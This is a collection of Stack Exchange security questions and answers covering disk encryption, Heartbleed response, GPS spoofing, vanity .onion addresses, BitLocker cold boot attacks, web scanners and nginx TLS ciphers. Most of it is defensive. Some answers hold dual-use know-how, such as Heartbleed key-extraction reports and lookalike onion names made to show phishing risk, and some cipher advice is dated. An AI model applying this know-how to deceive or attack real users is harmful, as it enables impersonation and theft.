<li><strong>XTS</strong> is counter-oriented chaining mode. It's an evolution of XEX (actually: ""XEX-based tweaked-codebook mode with ciphertext stealing""), while XEX (""xor-encrypt-xor"") is a non-trivial counter-based chaining mode; neither of which I can claim to completely understand. XTS is already very widely supported and looks promising, but <a href=""https://en.wikipedia.org/wiki/Disk_encryption_theory#XTS_weaknesses"">may have issues</a>. The primary important details are these: No fancy IVs are necessary (<code>plain</code> or <code>plain64</code> is fine), and half of your key is used by XTS, meaning your original key must be twice as long (hence 512-bit instead of 256-bit). </li>
<li><strong>PLAIN64</strong> is an IV generation mechanism that simply passes the 64-bit sector index directly to the chaining algorithm as the IV. <code>plain</code> truncates that to 32-bit. Certain chaining modes such as XTS don't need the IV to be unpredictable, while modes like CBC would be vulnerable to fingerprinting/watermarking attacks if used with plain IVs.</li>
</ul>

<p><strong>Other options not used by default</strong>  </p>

<ul>
<li><strong>LRW</strong> has been largely replaced by XTS because of some <a href=""http://en.wikipedia.org/wiki/IEEE_P1619#LRW_issue"">security concerns</a>, and is not even an option for most disk encryption products. </li>
<li><strong>benbi</strong> calculates a narrow-width block count using a shift register. It was built with LRW mode in mind.</li>
</ul>

<p>Altogether, this makes for a pretty tight system. It isn't the absolute best system theoretically possible, but it's pretty close. You should be able to trust it in any reasonable circumstances as long as your password is sufficient. Your attacker will almost certainly choose brute-forcing the password as his preferred attack method.</p>
","39309"
"Scanning for files than have been encrypted by CryptoLocker","56256","","<p>I am just asking in case someone has already done the analysis. A customer has a large set of network drives that were mapped to a CryptoLocker infected machine. The infection itself has been treated. I am looking for a tool or just a binary pattern to match to verify that a file is not encrypted based on a header/identifying characteristic of some sort in the file itself.</p>

<p>Yes, I know the list of encrypted files is in the infected machine's registry.  We are looking for direct verification.</p>

<p>To clarify: We know what extensions could be affected, I am just looking for a way to check if a specific file is encrypted without having a human double clicking on it.  Millions of files potentially affected so a manual test is not an option. Thus far my fallback is good ol' ""file"" which will give me a confirmed OK, but only on some file types.</p>

<p>I haven't found any commonalities between sample encrypted files yet, other than ""that looks random"".</p>
","<p>I found no unique characteristic to draw on that would produce highly reliable results.  The zip suggestion did not produce a significant difference with compressed formats like JPG or the newer compressed Office docs.</p>

<p>I turned to a clunky but semi-useful alternative:  Comparing the file extension with the results of a ""magic"" check.</p>

<p>Instead of using the <strong>file</strong> command from a bash script I cooked up a Python script for some more power.  (Here is the code: <a href=""https://github.com/Citon/strangethings/releases/"" rel=""nofollow"">https://github.com/Citon/strangethings/releases/</a> )  The results were a decent starting point.  Tuning your magic file database and fiddling with exceptions is required to reduce false positives.</p>

<p>To give it a try on a directory hit by CryptoLocker, download StrangeThings package and install following the README directions.  Then, copy ""strangethings.conf-SAMPLE"" to ""strangething.conf"".  Run it like so:</p>

<p>strangethings.py -c strangethings.conf -s cryptolocker DIRECTORYTOSCAN</p>

<p>YMMV.  Tested on Linux (Debian and CentOS).  See the answer from @brad-churby for a similar tool for Windows from OmniSpear.</p>
","44499"
"What should a website operator do about the Heartbleed OpenSSL exploit?","56042","","<p><a href=""http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0160"" rel=""noreferrer"">CVE-2014-0160</a></p>

<p><a href=""http://heartbleed.com"" rel=""noreferrer"">http://heartbleed.com</a></p>

<p>This is supposed to be a canonical question on dealing with the Heartbeat exploit.</p>

<p>I run an Apache web server with OpenSSL, as well as a few other utilities relying on OpenSSL (as client). What should I do to mitigate the risks?</p>

<hr>

<ul>
<li><a href=""http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html"" rel=""noreferrer"">The bug dissected</a></li>
<li><a href=""http://filippo.io/Heartbleed/"" rel=""noreferrer"">Check if your site is vulnerable</a> (Duckduckgo.com is, for instance!)</li>
</ul>

<hr>

<p><a href=""http://xkcd.com/1353"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/83hnd.png"" alt=""Obligatory XKCD""></a></p>

<pre><code> I looked at some of the data dumps
 from vulnerable sites,
 and it was ... bad.
 I saw emails, passwords, password hints.
 SSL keys and session cookies.
 Important servers
 brimming with visitor IPs.
 Attack ships on fire off 
 the shoulder of Orion,
 c-beams glittering in the dark
 near the Tannhäuser Gate.
 I should probably patch OpenSSL.
</code></pre>

<p>Credit: <a href=""http://xkcd.com/1353"" rel=""noreferrer"">XKCD</a>.</p>
","<p>There is <strong>more</strong> to consider than just new certificates (or rather, new key pairs) for every affected server. It also means:</p>

<ul>
<li>Patching affected systems to OpenSSL 1.0.1g</li>
<li>Revocation of the old keypairs that were just supersceded</li>
<li>Changing all passwords</li>
<li>Invalidating all session keys and cookies</li>
<li>Evaluating the actual content handled by the vulnerable servers that could have been leaked, and reacting accordingly.</li>
<li>Evaluating any other information that could have been revealed, like memory addresses and security measures</li>
</ul>

<p>Neel Mehta (the Google Security engineer who <a href=""https://www.cert.fi/en/reports/2014/vulnerability788210.html"" rel=""nofollow"">first reported</a> the bug) <a href=""https://twitter.com/neelmehta/statuses/453625474879471616"" rel=""nofollow"">has tweeted</a>:</p>

<blockquote>
  <p>Heap allocation patterns make private key exposure unlikely for #heartbleed #dontpanic.</p>
</blockquote>

<p>Tomas Rzepka (probably from Swedish security firm <a href=""http://www.certezza.net/sv/utbildning/certezzas-introduktion-till-ipv6/"" rel=""nofollow"">Certezza</a>) <a href=""https://twitter.com/1njected/status/453781230593769472"" rel=""nofollow"">replied</a> with what they had to do to recover keys:</p>

<blockquote>
  <p>We can extract the private key successfully on FreeBSD after
  restarting apache and making the first request with ssltest.py</p>
</blockquote>

<p>Private key theft has been also demonstrated by <a href=""https://www.cloudflarechallenge.com/heartbleed"" rel=""nofollow"">CloudFlare Challenge</a>.</p>

<p>And Twitter user <a href=""https://twitter.com/makomk"" rel=""nofollow"">makomk</a> chimed in <a href=""https://twitter.com/makomk/status/453829416003850240"" rel=""nofollow"">with</a>:</p>

<blockquote>
  <p>I've recovered it from Apache on Gentoo as a bare prime factor in
  binary, but your demo's a lot clearer...It has a lowish success rate,
  more tries on the same connection don't help, reconnecting may,
  restarting probably won't...Someone with decent heap exploitation
  skills could probably improve the reliability. I'm not really trying
  that hard.</p>
</blockquote>

<hr>

<p>I summarized the bullet points above from <a href=""http://heartbleed.com/"" rel=""nofollow"">heartbleed.com</a> (emphasis mine):</p>

<blockquote>
  <p><strong>What is leaked primary key material and how to recover?</strong></p>
  
  <p>These are the crown jewels, <strong>the encryption keys themselves</strong>. Leaked
  secret keys allows the attacker to decrypt any past and future traffic
  to the protected services and to impersonate the service at will. Any
  protection given by the encryption and the signatures in the X.509
  certificates can be bypassed. Recovery from this leak requires
  patching the vulnerability, revocation of the compromised keys and
  reissuing and redistributing new keys. Even doing all this will still
  leave any traffic intercepted by the attacker in the past still
  vulnerable to decryption. All this has to be done by the owners of the
  services.</p>
  
  <p><strong>What is leaked secondary key material and how to recover?</strong></p>
  
  <p>These are for example <strong>the user credentials (user names and
  passwords)</strong> used in the vulnerable services. Recovery from this leaks
  requires owners of the service first to restore trust to the service
  according to steps described above. After this users can start
  changing their passwords and possible encryption keys according to the
  instructions from the owners of the services that have been
  compromised. All session keys and session cookies should be invalided
  and considered compromised.</p>
  
  <p><strong>What is leaked protected content and how to recover?</strong></p>
  
  <p>This is <strong>the actual content handled by the vulnerable services</strong>. It
  may be personal or financial details, private communication such as
  emails or instant messages, documents or anything seen worth
  protecting by encryption. Only owners of the services will be able to
  estimate the likelihood what has been leaked and they should notify
  their users accordingly. Most important thing is to restore trust to
  the primary and secondary key material as described above. Only this
  enables safe use of the compromised services in the future.</p>
  
  <p><strong>What is leaked collateral and how to recover?</strong></p>
  
  <p>Leaked collateral are <strong>other details that have been exposed</strong> to the
  attacker in the leaked memory content. These may contain technical
  details such as memory addresses and security measures such as
  canaries used to protect against overflow attacks. These have only
  contemporary value and will lose their value to the attacker when
  OpenSSL has been upgraded to a fixed version.</p>
</blockquote>
","55089"
"How can you check the installed Certificate Authority in windows 7/8?","55765","","<p>And know which are not default ones installed by Microsoft?</p>
","<p>To view your certificate stores, run <code>certmgr.msc</code> as described <a href=""http://windows.microsoft.com/en-ca/windows-vista/view-or-manage-your-certificates"">there</a>. The ""root"" store contains the root CA, i.e. the CA which are trusted <em>a priori</em>. <code>certmgr.msc</code> shows you an aggregate view of all root CA which apply to the current user; internally, there are several relevant stores (the ""local machine"" stores apply to all users, the ""current user"" stores are specific to the current user; and there also are ""enterprise"" stores which are similar to ""local machine"" but meant to be filled automatically from the AD server of the current domain).</p>

<p>See <a href=""https://support.microsoft.com/kb/931125"">this page</a> for a list of all CA that Microsoft puts in Windows by default; any discrepancy would be a local variation. The list is occasionally updated, and this is propagated to your computer through the normal Windows update mechanisms.</p>
","48443"
"How do location-based apps avoid getting cheated by emulated GPS?","55615","","<p>Some apps like Foursquare require the user to ""check in"" at physical places, in order to gain money benefits.</p>

<p>Given that emulated GPS are available for customized versions of Android, it sounds easy to trick such apps.  </p>

<p>Given the monetary incentives, I am sure many people have tried, so how do apps prevent GPS cheating?</p>
","<p>There are many ways to track user's location on a mobile device (I will go into how that works later). </p>

<p>None of the tracking methods are particularly easy to spoof. It can be done but it is simply outside of the realm of the average user as it generally requires either a modified device (physically or programmatically) or external gear.</p>

<p>Moreover, it is far easier for developers to simply tie multiple forms of tracking with simple logic (IE you can only 'check in' x number of times within timeframe y) than it is for a hacker to spoof an app like foursquare and get that 5% discount on dinner. Once again, it can be done, but <em>[my theory is]</em> so far it is not economical to hackers.</p>

<p>As promised, here are a few of the big technologies leveraged in geographic tracking:</p>

<ul>
<li><strong><a href=""http://en.wikipedia.org/wiki/GPS_tracking_unit"" rel=""noreferrer"">GPS Reporting.</a></strong> This is probably most familiar to you. It is the most 'expensive' report because it requires relatively large amounts of power to read several GPS satellites. A pure GPS system is rarely used on mobile devices today. GPS devices can be spoofed programmatically (by changing the software's call to the GPS driver's position) even without modifying a device at all (<a href=""http://www.ae.utexas.edu/news/features/todd-humphreys-research-team-demonstrates-first-successful-gps-spoofing-of-uav"" rel=""noreferrer"">as seen here</a>).</li>
<li><strong><a href=""http://en.wikipedia.org/wiki/Mobile_phone_tracking"" rel=""noreferrer"">GSM Reporting</a>.</strong> This is perhaps the most common way your location is tracked through the day while you are moving around. The concept is simple. Your phone, with normal messages to the cell towers nearby, triangulates your position at a given time. This method is extremely hard to spoof without external hardware or seriously altering your phone's functionality (IE if you spoof a cell tower then yes you are 'not tracked' geographically, but you also cannot make phone calls). Additionally, cell traffic is encrypted. You could potentially spoof the access point where the apps software talks to the phone's cell tower data driver, but that is also difficult to say the least.</li>
<li><a href=""http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;ved=0CCcQFjAB&amp;url=http%3A%2F%2Fweb.cs.wpi.edu%2F~emmanuel%2FMQPs%2Flocus%2FLocus_MQP_Report.pdf&amp;ei=2QbqU8afFOfjsATTiIGQBQ&amp;usg=AFQjCNGOu_RWdAY3WiY93gC5d6jM-GqsGQ&amp;sig2=p8bbtX2LgfGfg1Tqu6YqHA&amp;bvm=bv.72676100,d.cWc&amp;cad=rja"" rel=""noreferrer""><strong>LAN Reporting.</strong></a> This is a pretty cool concept because it provides high levels of accuracy indoors (something that has traditionally been an issue). This requires much setup but at a minimum would allow apps to talk to registered wifi hotspots to confirm your location based on which wifi you are connected to. This is theoretically possible to spoof but it would largely depend on the levels of encryption for the legitimate connection's signature. </li>
<li><a href=""http://www.webtorials.com/content/2012/07/tracking-hackers-down---then-striking-back.html"" rel=""noreferrer""><strong>WAN Reporting.</strong></a> This is nothing more than simple IP address reporting. This is perhaps the easiest to spoof, but I put it in here for completeness as it is very common to mobile friendly sites.</li>
<li><strong><a href=""http://en.wikipedia.org/wiki/Location-based_service#Control_plane_locating"" rel=""noreferrer"">Others</a> (Bluetooth, RFID, Inertial nav, experimental, etc)</strong> There are quite a few other methods out there. One of my favorites is <a href=""http://en.wikipedia.org/wiki/Inertial_navigation_system"" rel=""noreferrer"">Inertial Navigation</a> where there are no external transmissions (thus potentially very difficult to spoof) as it uses internal sensors and map to ascertain your position. This is seen in missile guidance systems as well as some apps. Life360 for instance uses a variation of this as it uses very little power (all the sensors are already active). </li>
</ul>

<p>Other things to remember:</p>

<ul>
<li>Developers can leverage any number of these technologies, thus making an app even harder to spoof.</li>
<li>Most location data is stored on a mobile device (and sometimes in many places) until explicitly deleted. Thus a developer can (potentially) access previous location data points. So if you say you were at cafe mama's 20 times todays and the app simply talks to siri to find out your last geo-data point was 100 miles away, the app will wonder...</li>
<li>Law Enforcement would have far greater ability to determine your real location so just because you may have spoofed an app doesn't mean you should bet your life on it (some comments elsewhere suggested that you could use this spoofing nefariously, so I thought I'd toss this in here).</li>
</ul>
","65215"
"Asymmetric vs Symmetric Encryption","55507","","<p>I am currently taking a principles of information security class. While talking about different encryption methods a large number of my classmates seem to believe that Asymmetric Encryption is better (more secure) than Symmetric Encryption. A typical statement is something like this:</p>

<blockquote>
  <p>Generally asymmetric encryption schemes are more secure because they
  require both a public and a private key.</p>
</blockquote>

<p>Certainly with symmetric encryption you have to worry about secure key exchange but as far as I can tell there's no inherent reason why one must be more secure than the other. </p>

<p>Especially given that the asymmetric part is often just used for the key exchange and then the actual data is encrypted with a symmetric algorithm.</p>

<p>So, am I missing something or can a general statement like this really be made about which is more secure.</p>

<hr>

<p>So if I have a message encrypted with AES and another copy encrypted with RSA and all other things being equal which is more likely to be cracked. Can this comparison even be made? </p>
","<p>There is a sense in which you can define the <strong>strength</strong> of a particular encryption algorithm¹: roughly speaking, the strength is the number of attempts that need to be made in order to break the encryption. More precisely, the strength is the amount of computation that needs to be done to find the secret. Ideally, the strength of an algorithm is the number of brute-force attempts that need to be made (weighed by the complexity of each attempt, or reduced if some kind of parallelization allows for multiple attempts to share some of the work); as attacks on the algorithm improve, the actual strength goes down.</p>

<p>It's important to realize that “particular encryption algorithm” includes considering a specific key size. That is, you're not pitching RSA against AES, but 1024-bit RSA (with a specific padding mode) with AES-256 (with a specific chaining mode, IV, etc.). In that sense, you can ask: if I have a copy of my data encrypted with algorithm A with given values of parameters P and Q (in particular the key size), and a copy encrypted with algorithm B with parameters P and R, then which of (A,Pval₁,Qval₁) and (B,Pval₂,Rval₂) is likely to be cracked first?</p>

<p>In practice, many protocols involve the use of multiple cryptographic primitives. Different primitives have different possible uses, and even when several primitives can serve a given function, there can be one that's better suited than others. When choosing a cryptographic primitive for a given purpose, the decision process goes somewhat like this:</p>

<ol>
<li>What algorithms can do the job? → I can use A or B or C.</li>
<li>What strength to I need? → I want 2<sup>N</sup> operations, so I need key size L<sub>A</sub> for primitive A, L<sub>B</sub> for primitive B, L<sub>C</sub> for primitive C.</li>
<li>Given my constraints (brute speed, latency, memory efficiency, …), which of these (L<sub>A</sub>-bit A or L<sub>B</sub>-bit B or L<sub>C</sub>-bit C) is best?</li>
</ol>

<p>For example, let's say your requirement is a protocol for exchanging data with a party you don't trust. Then symmetric cryptography cannot do the job on its own: you need some way to share the key. Asymmetric cryptography such as RSA can do the job, if you let the parties exchange public keys in advance. (This is not the only possibility but I won't go into details here.) So you can decide on whatever RSA key length has the right strength for your application. However RSA is slow and cumbersome (for example there aren't standard protocols to apply RSA encryption to a stream — mainly because no one has bothered because they'd be so slow). Many common protocols involving public-key cryptography use it only to exchange a limited-duration secret: a session key for some symmetric cryptography algorithm. This is known as <a href=""http://en.wikipedia.org/wiki/Hybrid_cryptosystem"">hybrid encryption</a>. Again, you choose the length of the session key according to the desired strength. In this scenario, the two primitives involved tend to have the same strength.</p>

<p>¹ <sub>
The same notion applies to other uses of cryptography, such as signing or hashing.
</sub>  </p>
","7226"
"How do you get a specific .onion address for your hidden service?","55496","","<p>.onion addresses normally should be made of a base32 string of the first 80 bits of the SHA1 hash of the private key of the server (see <a href=""https://gitweb.torproject.org/torspec.git/tree/rend-spec.txt#n526"">.onion address specification</a>).</p>

<p>Today I ran into a service which clearly doesn't have an arbitrary address: <a href=""http://sms4tor3vcr2geip.onion/"">http://sms4tor3vcr2geip.onion/</a></p>

<p>How does that work and is it secure?</p>
","<p><strong>Shallot</strong> is an older program, there are newer alternatives available now:</p>

<p><strong>Scallion</strong> - uses GPU hashing, needs .NET or Mono: <a href=""http://github.com/lachesis/scallion"">http://github.com/lachesis/scallion</a></p>

<p><strong>Eschalot</strong> - uses wordlist search, needs Unix or Linux: <a href=""http://blacksunhq56imku.onion"">http://blacksunhq56imku.onion</a></p>

<p>Eschalot can find longer human-readable names like seedneedgoldcf6m.onion, hostbathdarkviph.onion, etc.</p>

<p>The performance chart quoted above is a bit obsolete now, 8-10 character long .onions are easy enough to find.</p>

<p>There was a discussion back in the day, when shallot first surfaced, about whether custom names for hidden services are bad or not.</p>

<p><strong>Problem number one:</strong> generated keys have a much larger public exponent than the standard keys produced by TOR, which puts a somewhat higher load on the TOR relays.</p>

<p>Answer: it was concluded that the difference is negligible compared to the other encryption tasks the relays perform constantly. In eschalot, the largest public exponent is limited to 4294967295 (4 bytes).</p>

<p><strong>Problem number two:</strong> TOR developers can decide to filter and block all the custom names.</p>

<p>Answer: yes, they can, but they have not yet and there is really no reason for them to do so. They can just as easily change the standard for the random names too and cause chaos and mass exodus on the network.</p>

<p><strong>Problem number three:</strong> generated names are easily spoofed, since the visitor clicking on a link somewhere out there can be tricked by the seemingly right .onion prefix without checking the whole thing. To demonstrate, which one is the real SilkRoad?</p>

<pre><code>silkroada7bc3kld.onion
silkroadqksl72eb.onion
silkroadcqgi4von.onion
silkroady3c2vzwt.onion
silkroadf3drdfun.onion
silkroadbdcmw7rj.onion
</code></pre>

<p>Answer: neither, I generated all of them to demonstrate the problem. If you recognized that those were all fakes, you probably spend more time on the SilkRoad than I care to know about :).</p>

<p>To be fair, completely random addresses are even worse - if somebody edits one of the onion links wikis and replaces one random address with another, the casual visitor using that wiki would not know the difference.</p>

<p>Solution: it's essentially up to the person to pay attention which site he is really visiting, but the site owner can create a human readable address that is easier to remember, even if it's a completely random gibberish. As long as it's long and easy to memorize and identify. Some examples:</p>

<pre><code>fledarmyusertvmu.onion
wifefeelkillwovk.onion
ladyfirehikehs66.onion
woodcubabitenem2.onion
</code></pre>

<p>I did not spend the time to intentionally generate good names, just picked some from the list I had left after testing eschalot. With a (very) large wordlist, unique looking names are easy to generate, but it will take time to go through
the results and manually locate the ones that are decent.</p>

<p>Well, that was my opinion and it could be wrong.</p>

<p>--
Hiro</p>
","31857"
"Is Windows BitLocker secure?","55408","","<p>Naturally I feel that I have to ask this question, since it's a built-in feature in Windows. Let's say someone has physical access to my PC, is there an easy way for them to access a BitLocker protected drive without physically tampering with the PC (such as hardware keyloggers)?</p>
","<p>There is currently only one cold boot attack I know of that works against bitlocker. However it would need to be executed seconds after the computer has been turned off (it can be extended to minutes if the DRAM modules are cooled down significantly) but due to the timeframe of execution it's rather implausible. Bitlocker is secure as long as your machine is completely turned off when you store it (hibernate is also ok, but sleep needs to be disabled).</p>
","40444"
"What do the UDP entries in my netstat output stand for?","55259","","<p>I ran netstat -a under windows.</p>

<p>what is the meaning of this line  <code>UDP    [::]:57427             *:*</code> ?</p>

<pre><code>Proto  Local Address          Foreign Address        State
UDP    [::]:5355              *:*
UDP    [::]:57427             *:*
UDP    [::1]:5353             *:*
</code></pre>

<p>I wonder if one of those is a backdoor to my machine?</p>
","<p><strong>Break down:</strong></p>

<p>Your computer is listening on UDP ports 5355, 57427, 5353 and accepting communications from any foreign address.</p>

<p>5355 and 5353 might be DNScache<br/>
57427 might be FDResPub, which is a Windows OS DLL, that advertises the computer and its resources to the network.</p>

<p>Running:</p>

<pre><code>netstat -a -p UDP -b
</code></pre>

<p>can be helpful in determining what is attached to those ports.</p>

<p><br/></p>

<p><strong>[::] and [::1]</strong></p>

<p>If you run </p>

<pre><code>netstat -a -p UDP
</code></pre>

<p>you will see that the [::] lines are equivalent to ""0.0.0.0"", which means that these ports are bound to any local IP address. [::1] lines are equivalent to 127.0.0.1, which is the local host.</p>
","13742"
"What tools are available to assess the security of a web application?","54736","","<p>What tools are available to assess the security of a web application? </p>

<p>Please provide a small description of what the tool does.</p>

<p><strong>Update:</strong> More specifically, I'm looking for tools that assume no access to the source code (black box).</p>
","<p>there's a large number of apps that can be used in web application assessments.  One thing to consider is what kind of tool you're looking for.  Some of them are better used alongside a manual test, where others are more designed for non-security specialist IT staff as more ""black box"" scanning tools.</p>

<p>On top of that there's a huge range of scripts and point tools that can be used to assess specific areas of web application security.</p>

<p>Some of my favorites</p>

<p>Burp suite - <a href=""http://www.portswigger.net"" rel=""nofollow"">http://www.portswigger.net</a> . Free and commercial tool.  Excellent adjunct to manual testing and has a good scanner capability as well.  Of professional web application testers I know, most use this.</p>

<p>W3af - <a href=""http://w3af.org/"" rel=""nofollow"">http://w3af.org/</a> - Open source scanning tool, seems to be developing quite a bit at the moment, primarily focuses on the automated scanning side of things, is still requires quite a bit of knowledge to use effectively.</p>

<p>On the pure scanning side there's a number of commercial tools available.</p>

<p>Netsparker - <a href=""http://www.mavitunasecurity.com/netsparker/"" rel=""nofollow"">http://www.mavitunasecurity.com/netsparker/</a></p>

<p>IBM AppScan - <a href=""http://www-01.ibm.com/software/awdtools/appscan/"" rel=""nofollow"">http://www-01.ibm.com/software/awdtools/appscan/</a></p>

<p>HP WebInspect - <a href=""https://h10078.www1.hp.com/cda/hpms/display/main/hpms_content.jsp?zn=bto&amp;cp=1-11-201-200"" rel=""nofollow"">https://h10078.www1.hp.com/cda/hpms/display/main/hpms_content.jsp?zn=bto&amp;cp=1-11-201-200</a>^9570_4000_100__</p>

<p>Cenzic Hailstorm - <a href=""http://www.cenzic.com/products/cenzic-hailstormPro/"" rel=""nofollow"">http://www.cenzic.com/products/cenzic-hailstormPro/</a></p>

<p>Acunetix WVS - <a href=""http://www.acunetix.com/vulnerability-scanner/"" rel=""nofollow"">http://www.acunetix.com/vulnerability-scanner/</a></p>

<p>NTObjectives NTOSpider - <a href=""http://www.ntobjectives.com/ntospider"" rel=""nofollow"">http://www.ntobjectives.com/ntospider</a></p>
","38"
"Where do you store your personal private GPG key?","54675","","<p>So, I want to start using <a href=""http://www.zx2c4.com/projects/password-store/"">pass</a>, but I need a GPG key for this. This application will store all of my passwords, which means it's very important that I <strong>don't lose</strong> my private key, once generated.</p>

<p>Hard disks break, cloud providers are generally not trusted. Not that I don't trust them to not mess with my key, but their security can be compromised, and all my passwords could be found.</p>

<p>So, where can I safely store my GPG private key?</p>
","<p>I like to store mine on paper.</p>

<p>Using a JavaScript (read: offline) <a href=""http://en.wikipedia.org/wiki/QR_code"">QR code</a> generator, I create an image of my private key in ASCII armoured form, then print this off. Note alongside it the key ID and store it in a physically secure location.</p>

<p>If you have a large key or lots of keys I recommend <a href=""https://github.com/Rupan/paperbak"">paperbak</a>, although be sure to write down instructions on how to recover the data later. Just as important as how you back it up is how you restore it from a backup. I'd probably try this with dummy data just to be sure you know exactly how it works.</p>

<hr>

<p>Worth noting you <em>can</em> protect your private key with a passphrase, so even if it's hosted with a cloud provider they can't see your private key, but then all your password security is reduced to that passphrase rather than the full private key, not to mention cloud providers can disappear overnight.</p>
","51776"
"Why are chips safer than magnetic stripes?","54111","","<p>After the recent Target hack there has been <a href=""http://www.npr.org/blogs/alltechconsidered/2014/01/23/264910138/target-hack-a-tipping-point-in-moving-away-from-magnetic-stripes"">talk</a> about moving from credit cards with magnetic stripes to cards with a chip.</p>

<p>In what ways are chips safer than stripes?</p>
","<p>You can't clone the chip.</p>

<p>A magnetic strip holds a secret number, and if someone knows that number they can claim to be the owner of the card. But if a bad guy swipes the card, they then know the number, and can make their own card, i.e. ""cloning"". This has turned out to be a major practical problem with magstripe cards.</p>

<p>A chip also holds a secret number. However, it is securely embedded in the chip. When you use the card, the chip performs a public key operation that proves it knows this secret number. However, it never reveals that secret number. If you put a chipped card in a bad guys machine, they can impersonate you for that one transaction, but they cannot impersonate you in the future.</p>

<p>All of the above assumes that the implementation of the chip is good. Some chips have been known to have implementation flaws that leak the secret code. However, chip and pin is now pretty mature, so I expect most of these issues have been ironed out.</p>
","49236"
"Recommended ssl_ciphers for security, compatibility - Perfect Forward secrecy","53802","","<p>I'm currently using nginx with the following ciphers:</p>

<pre><code>ssl_ciphers HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;
</code></pre>

<p>I would like to maintain compatibility to older browsers, especially also older mobile browsers and therefore not completely disallow SHA1.</p>

<p>How can I achieve that SHA256 is preferred over SHA1 for MAC (Message Authentication Code
) and always used when possible.</p>

<p>I can i.e. force SHA256 to be applied by adding SHA256:!SHA: to my ssl_ciphers string but this would also disallow SHA1 completely.</p>

<p>With the ssl_cipher at the beginning it tends however to just use SHA1. Any recommendations?</p>

<hr>

<p><strong>Update 29.12.2014</strong></p>

<p>Thanks everybody for the constructive inputs and discussion.</p>

<p>Even though I still think that the <a href=""https://wiki.mozilla.org/Security/Server_Side_TLS"" rel=""nofollow noreferrer"">Mozilla page on Server side TLS</a> overall covers the topic quite good - I would only recommend the <a href=""https://wiki.mozilla.org/Security/Server_Side_TLS#Modern_compatibility"" rel=""nofollow noreferrer"">Modern compatibility</a> with the limitation that the DSS ciphers should be removed from it and explicitly disallowed (!DSS) as recommended in the comment by Anti-weakpasswords - thanks for spotting it.</p>

<pre><code>ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK
</code></pre>

<p>Interestingly ssllabs did not alert or down rate for this...</p>

<p>Further I prefer to use custom generated diffie hellman parameters. Even though the standard ones are obviously considered safe. <a href=""https://security.stackexchange.com/questions/56214/what-are-the-openssl-standard-diffie-hellmann-parameters-primes"">What are the OpenSSL standard Diffie Hellmann parameters (primes)?</a></p>

<pre><code>openssl dhparam -check -out /etc/ssl/private/dhparams.pem 2048
</code></pre>

<p>increase that to 4096 for paranoia and fun if you like.</p>
","<p>First, let's go over how cipher suite negotiation works, very briefly.  For example, we can use the TLS 1.2 document <a href=""http://tools.ietf.org/html/rfc5246#section-7.4.1.2"">RFC 5246 starting at section 7.4.1.2</a> to see, in the short short form:</p>

<ul>
<li>ClientHello: The client tells the server which cipher suites the client supports</li>
<li>Now the server picks one
<ul>
<li>I'll discuss how to control which one it picks next!</li>
</ul></li>
<li>ServerHello: The server tells the client which cipher suite it has chosen, or gives the client a failure message.</li>
</ul>

<p>Now, as to the actual selection.  I've used the <a href=""http://nginx.org/en/docs/http/ngx_http_ssl_module.html"">nginx ssl module documentation</a>, the <a href=""https://community.qualys.com/blogs/securitylabs/2013/08/05/configuring-apache-nginx-and-openssl-for-forward-secrecy"">Qualys 2013 article on Configuring Apache, Nginx, and OpenSSL for Forward Secrecy</a>, and the <a href=""https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/"">Hynek Hardening Your Web Server’s SSL Ciphers</a> article for reference.  The latter two cover both Apache and Nginx (as both use OpenSSL as a base).</p>

<p>Essentially, you need to tell Nginx to use the order you select, and you need to select an order.  To see what the results of that order would be, you can use the OpenSSL command line, e.g.</p>

<pre><code>openssl ciphers -v 'EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA256:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EDH+aRSA+AESGCM:EDH+aRSA+SHA256:EDH+aRSA:EECDH:!aNULL:!eNULL:!MEDIUM:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4:!SEED'
</code></pre>

<p>NOTE: You may want to remove :!3DES from that string; 3-key triple-DES isn't efficient, but it is still secure in and of itself to more or less 112 bits of security, and is very, very common.</p>

<p>Use the above command to determine which cipher suites will be most preferred and least preferred in your configuration, and change it until you like the results.  The references I've given have their own strings; I amended it slightly to get the above example (removing RC4 and SEED, and putting every TLS 1.2 cipher suite above any 'SSLv3' cipher suite, for example).</p>

<p>Then, for Nginx in particular, you would alter your configuration file to include something like:</p>

<pre><code>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
ssl_prefer_server_ciphers on;
ssl_ciphers ""EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA256:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EDH+aRSA+AESGCM:EDH+aRSA+SHA256:EDH+aRSA:EECDH:!aNULL:!eNULL:!MEDIUM:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4:!SEED"";
</code></pre>

<p>Add in SSLv3 to ssl_protocols if you really insist on it.</p>

<p>The ssl_prefer_server_ciphers will inform nginx to use the order we specify, and ignore the order the client presents their cipher list in.  Now, if the only shared cipher suite between the ClientHello and the list OpenSSL ciphers -v ... gives is our least preferred cipher, that's of course what nginx will use.  If nothing matches, then we send the client a failure notice.</p>

